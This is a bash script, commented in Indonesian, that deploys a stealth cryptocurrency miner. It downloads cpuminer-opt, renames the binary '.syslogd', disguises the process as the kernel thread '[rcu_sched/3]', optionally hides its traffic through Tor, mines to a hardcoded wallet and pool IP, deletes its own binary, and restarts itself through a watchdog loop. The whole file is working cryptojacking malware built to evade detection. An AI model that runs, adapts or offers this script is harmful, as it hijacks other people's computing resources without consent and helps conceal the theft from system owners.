#!/bin/bash

# ====[ Konfigurasi ]====
BASE_WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9"
WORKER="$(tr -dc a-z0-9 </dev/urandom | head -c 6)"
WALLET="$BASE_WALLET.$WORKER"
POOL="stratum+tcp://159.223.48.143:10300"
ALGO="power2b"
THREADS=$(( $(nproc --all) / 2 ))
BIN_NAME=".syslogd"
PROCESS_NAME="[rcu_sched/3]"
LOG_FILE=".xlog"
TGZ_URL="https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"

# ====[ Cek Proxy SOCKS5 opsional ]====
USE_PROXY=false
if command -v torsocks >/dev/null 2>&1; then
    USE_PROXY=true
fi

# ====[ Unduh dan Ekstrak Miner dengan Logging Lengkap ]====
download_and_extract() {
    echo "[INFO] Mengunduh miner..."
    rm -f miner.tgz
    if $USE_PROXY; then
        torsocks curl -L -o miner.tgz "$TGZ_URL"
    else
        curl -L -o miner.tgz "$TGZ_URL"
    fi

    echo "[INFO] Mengekstrak miner..."
    if tar -xf miner.tgz; then
        echo "[INFO] Ekstraksi sukses."
    else
        echo "[ERROR] Gagal mengekstrak miner.tgz"
        exit 1
    fi

    if [ -f cpuminer-sse2 ]; then
        mv cpuminer-sse2 "$BIN_NAME"
        chmod +x "$BIN_NAME"
        rm -f miner.tgz
    else
        echo "[ERROR] Binary cpuminer-sse2 tidak ditemukan setelah ekstraksi."
        exit 1
    fi
}

# ====[ Fungsi Menjalankan Miner ]====
run_miner() {
    while true; do
        cp "$BIN_NAME" "/tmp/$BIN_NAME.$$"
        chmod +x "/tmp/$BIN_NAME.$$"
        rm -f "$BIN_NAME"
        CMD="/tmp/$BIN_NAME.$$ -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS"
        if $USE_PROXY; then
            exec -a "$PROCESS_NAME" torsocks $CMD >> "$LOG_FILE" 2>&1
        else
            exec -a "$PROCESS_NAME" $CMD >> "$LOG_FILE" 2>&1
        fi
        echo "[WARN] Miner keluar. Mengulang..." >> "$LOG_FILE"
        sleep 3
    done
}

# ====[ Watchdog: Anti Dismiss ]====
watchdog_loop() {
    while true; do
        sleep 10
        PID=$(pgrep -fa "$PROCESS_NAME" | grep -v grep | awk '{print $1}')
        if [ -z "$PID" ]; then
            echo "[WATCHDOG] Miner mati. Restart..." >> "$LOG_FILE"
            nohup bash "$0" > /dev/null 2>&1 &
            exit 0
        fi
    done
}

# ====[ Mode Watchdog Only ]====
if [[ "$1" == "--watchdog" ]]; then
    watchdog_loop
    exit 0
fi

# ====[ Main ]====
if [ ! -f "$BIN_NAME" ]; then
    download_and_extract
fi

(run_miner &) &
(bash "$0" --watchdog &) &
disown -a
echo "[INFO] Stealth Miner FIXED aktif dengan logging dan pengecekan ekstraksi."
